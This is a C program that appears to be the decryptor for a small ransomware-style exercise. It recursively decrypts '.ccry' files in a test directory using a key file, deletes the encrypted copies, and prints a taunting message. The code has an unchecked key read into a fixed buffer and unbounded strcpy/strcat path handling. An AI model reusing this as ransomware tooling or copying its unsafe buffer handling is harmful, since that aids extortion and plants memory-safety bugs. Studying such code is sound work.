#include <sodium/crypto_secretstream_xchacha20poly1305.h>
#include <stdlib.h>

#include "dirent.h"
#include "sodium.h"
#include "stdio.h"
#include "string.h"

#define CHUNK_SIZE 4096

static int decrypt(const char *to_encrypt, const char *source_file,
                   const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]) {
    unsigned char buf_in[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char buf_out[CHUNK_SIZE];
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    crypto_secretstream_xchacha20poly1305_state st;
    FILE *fp_t, *fp_s;
    unsigned long long out_len;
    size_t rlen;
    int eof;
    int ret = -1;
    unsigned char tag;

    fp_s = fopen(source_file, "rb");
    fp_t = fopen(to_encrypt, "wb");
    fread(header, 1, sizeof header, fp_s);
    if (crypto_secretstream_xchacha20poly1305_init_pull(&st, header, key) != 0) {
        goto ret;
    }
    do {
        rlen = fread(buf_in, 1, sizeof buf_in, fp_s);
        eof = feof(fp_s);
        if (crypto_secretstream_xchacha20poly1305_pull(&st, buf_out, &out_len, &tag, buf_in, rlen, NULL, 0) !=
            0) {
            goto ret;
        }
        if (tag == crypto_secretstream_xchacha20poly1305_TAG_FINAL && !eof) {
            goto ret;
        }
        fwrite(buf_out, 1, (size_t)out_len, fp_t);
    } while (!eof);

    ret = 0;
ret:
    fclose(fp_t);
    fclose(fp_s);
    return ret;
}

// remove extension takes away the .ccry extension from a filename
char *remove_extension(char *s) {
    int n;
    int i;
    char *new;
    for (i = 0; s[i] != '\0'; i++)
        ;
    n = i - 5 + 1;
    if (n < 1)
        return NULL;
    new = (char *)malloc(n * sizeof(char));
    for (i = 0; i < n - 1; i++)
        new[i] = s[i];
    new[i] = '\0';
    return new;
}

int check_extension(const char *str, const char *suffix) {
    if (!str || !suffix)
        return 0;
    size_t lenstr = strlen(str);
    size_t lensuffix = strlen(suffix);
    if (lensuffix > lenstr)
        return 0;
    return strncmp(str + lenstr - lensuffix, suffix, lensuffix) == 0;
}

char *root_dir_path = "./test_dir";
unsigned char decrypt_key[crypto_secretstream_xchacha20poly1305_KEYBYTES];
void decryptRecursively(char *basePath) {
    char path[4096];
    struct dirent *dp;
    DIR *dir = opendir(basePath);

    // Unable to open directory stream
    if (!dir) {
        char filename[256] = {0};
        snprintf(filename, 255, "%s.ccry", basePath);

        // check that the file is encrypted in the first place
        if (!check_extension(basePath, ".ccry")) {
            return;
        }

        // remove the file extension to get the new name
        char *new_file_name = remove_extension(basePath);

        printf("decrypting %s\n", basePath);
        if (decrypt(new_file_name, basePath, decrypt_key) != 0)
            printf("Error encrypting file %s", basePath);

        // after the file has been ecrypted delete it.
        int r = remove(basePath);
        if (r != 0) {
            printf("error deleting file after encryption\n");
        }
        return;
    } else {
        while ((dp = readdir(dir)) != NULL) {
            if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0) {
                char filename[256] = {0};
                strcpy(path, basePath);
                strcat(path, "/");
                strcat(path, dp->d_name);
                decryptRecursively(path);
            }
        }
    }

    closedir(dir);
}

int main(void) {
    FILE *file = fopen("./dkey.txt", "r+");
    if (file == NULL)
        exit(EXIT_FAILURE);
    fseek(file, 0, SEEK_END);
    long int size = ftell(file);
    fclose(file);
    file = fopen("./dkey.txt", "r+");
    int bytes_read = fread(decrypt_key, sizeof(unsigned char), size, file);

    fclose(file);
    decryptRecursively(root_dir_path);
    printf("All of your files have now been decrypted.\nHave fun...\n");

    return EXIT_SUCCESS;
}
